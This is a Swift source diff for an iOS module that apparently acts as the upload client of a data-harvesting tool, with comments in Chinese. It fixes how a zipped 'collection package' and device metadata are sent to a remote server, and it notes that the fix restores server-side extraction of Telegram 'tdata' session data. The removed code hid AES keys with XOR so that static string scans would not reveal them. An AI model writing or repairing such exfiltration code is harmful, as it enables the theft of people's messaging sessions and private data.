@@ -228,39 +228,19 @@ public func wqnet_apps(_ jsonArray: UnsafePointer<CChar>?) -> Int32 {
     }
 }
 
-// MARK: - 上传用的 AES-128-CBC key/iv
-//
-// 服务端 /api/upload/zip 的 params 不是 V2 envelope，而是
-// AES-128-CBC(device.aes) 加密后的 base64（dist/modules/device/config.js）。
-// 这一对与原版主二进制 7T 里明文写着的 key/iv 一致，不在客户端 secrets.json
-// 的四组里，所以按 WQV2.serverPublicKey 同样的片段异或内置，避免明文常量
-// 被 strings 直接捞走。
-private enum UploadAES {
-    private static let mask: UInt8 = 0x5e
-    private static let keyEnc: [UInt8] = [0xe2, 0x73, 0x2e, 0xef, 0x7c, 0x53, 0x18, 0xeb,
-                                          0xdd, 0x9e, 0x35, 0x1f, 0xf0, 0xeb, 0x50, 0x1a]
-    private static let ivEnc: [UInt8] = [0x2f, 0xb3, 0xd2, 0x64, 0xda, 0x2e, 0x10, 0x7a,
-                                         0xfd, 0xf4, 0x5a, 0x37, 0xec, 0x06, 0x9f, 0x3b]
-
-    private static func decode(_ src: [UInt8]) -> Data {
-        var out = [UInt8](repeating: 0, count: src.count)
-        for i in 0..<src.count {
-            out[i] = src[i] ^ mask ^ UInt8(i & 0xff)
-        }
-        return Data(out)
-    }
-
-    static var key: Data { decode(keyEnc) }
-    static var iv: Data { decode(ivEnc) }
-}
+// 上传用的是 V2 envelope，不是 AES：
+//   pathZip 指向 api/<prefix>/upload/zip，走 dist/modules/device/controller/open/v2.js
+//   的 uploadZip → readEnvelope(fields) 只认 fields.meta / fields.params 里的 V2 envelope，
+//   解出 session.plain 后再用 AES 重新封给 uploadService.save。
+//   （controller/open/upload.js 的 /api/upload/zip 才是旧 AES params 那条路。）
 
 /// 上传采集包（multipart）。返回 0 成功。
 ///
-/// 服务端契约（dist/modules/device/controller/open/upload.js）：
-///     POST /api/upload/zip
-///     fields.params = AES-128-CBC(device.aes, JSON meta) 的 base64
+/// 服务端契约（dist/modules/device/controller/open/v2.js uploadZip）：
+///     POST api/&lt;prefix&gt;/upload/zip
+///     fields.params = V2 envelope（JSON 文本）
 ///     files.file    = 未加密 ZIP
-/// 之前这里发的是名为 "payload" 的 V2 envelope，服务端 fields.params 取不到，
+/// 原来字段名是 "payload"，服务端 readEnvelope 只认 meta / params，所以一直取不到，
 /// bundle_id / file_md5 全空，TG 的 tdata 提取也不会触发。
 @_cdecl("wqnet_upload")
 public func wqnet_upload(_ filePath: UnsafePointer<CChar>?, _ bundleID: UnsafePointer<CChar>?) -> Int32 {
@@ -277,30 +257,25 @@ public func wqnet_upload(_ filePath: UnsafePointer<CChar>?, _ bundleID: UnsafePo
     let url = WQV2.baseURL.appendingPathComponent(realPath)
     let fileName = (path as NSString).lastPathComponent
 
-    let meta: [String: Any] = [
-        "app_uuid": netAppUUID(),
+    let params: [String: Any] = netDeviceParams(extra: [
         "bundle_id": bundle,
         "file_name": fileName,
         "file_md5": md5Hex(fileData),
-        "timestamp": Int64(Date().timeIntervalSince1970 * 1000),
-        "app_version": (Bundle.main.infoDictionary?["CFBundleShortVersionString"] as? String) ?? "0",
-        "app_pac": Bundle.main.bundleIdentifier ?? "",
-        "machine": netMachineName(),
-        "ios_version": UIDevice.current.systemVersion,
-    ]
-    guard let metaData = try? JSONSerialization.data(withJSONObject: meta),
-          let sealed = WQV2.aesCBC(encrypt: true, key: UploadAES.key, iv: UploadAES.iv, input: metaData) else {
-        NSLog("[WQNet] upload: params seal failed")
+    ])
+    let uploadUUID = netAppUUID()
+    let uploadContext = WQV2.Context(method: "POST", path: realPath, appUUID: uploadUUID)
+    guard let uploadSession = try? WQV2.newSession(params, context: uploadContext),
+          let envelope = try? JSONSerialization.data(withJSONObject: uploadSession.body) else {
+        NSLog("[WQNet] upload: v2 seal failed")
         return -4
     }
-    let paramsB64 = sealed.base64EncodedString()
 
     let boundary = "----WQFiles\(UUID().uuidString)"
     var body = Data()
     body.append(Data("--\(boundary)\r\n".utf8))
     body.append(Data("Content-Disposition: form-data; name=\"params\"\r\n".utf8))
-    body.append(Data("Content-Type: text/plain\r\n\r\n".utf8))
-    body.append(Data(paramsB64.utf8))
+    body.append(Data("Content-Type: application/json\r\n\r\n".utf8))
+    body.append(envelope)
     body.append(Data("\r\n--\(boundary)\r\n".utf8))
     body.append(Data("Content-Disposition: form-data; name=\"file\"; filename=\"\(fileName)\"\r\n".utf8))
     body.append(Data("Content-Type: application/zip\r\n\r\n".utf8))
